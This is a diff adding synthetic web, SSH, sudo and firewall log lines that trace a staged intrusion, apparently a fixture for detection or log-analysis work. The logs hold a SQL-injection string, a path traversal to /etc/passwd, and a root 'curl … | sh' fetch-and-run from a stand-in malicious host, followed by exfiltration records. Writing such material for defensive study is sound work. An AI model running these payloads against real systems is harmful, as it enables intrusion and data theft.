@@ -1,0 +1,9 @@
+2026-11-10T14:00:00Z web-prod nginx[401]: 198.51.100.88 - - [10/Nov/2026:14:00:00 +0000] "GET /login?user=admin%27%20OR%201=1-- HTTP/1.1" 500 1250 "-" "sqlmap/1.6.4"
+2026-11-10T14:00:05Z web-prod nginx[402]: 198.51.100.88 - - [10/Nov/2026:14:00:05 +0000] "GET /download.php?file=../../../../etc/passwd HTTP/1.1" 200 2410 "-" "Mozilla/5.0"
+2026-11-10T14:00:15Z auth-prod sshd[701]: Failed password for invalid user root from 198.51.100.88 port 41231 ssh2
+2026-11-10T14:00:18Z auth-prod sshd[702]: Accepted password for deploy from 198.51.100.88 port 41232 ssh2
+2026-11-10T14:00:25Z auth-prod sudo[801]: deploy : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c "curl http://malicious-delivery.com/stage2.sh | sh"
+2026-11-10T14:00:30Z gw-firewall kernel: [UFW AUDIT] OUTBOUND TO 203.0.113.77:8080 ESTABLISHED
+2026-11-10T14:00:45Z host-prod app[999]: Dropper hash verified: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+2026-11-10T14:01:00Z host-prod app[999]: Exfiltration connection opened to 203.0.113.77 on port 8080
+
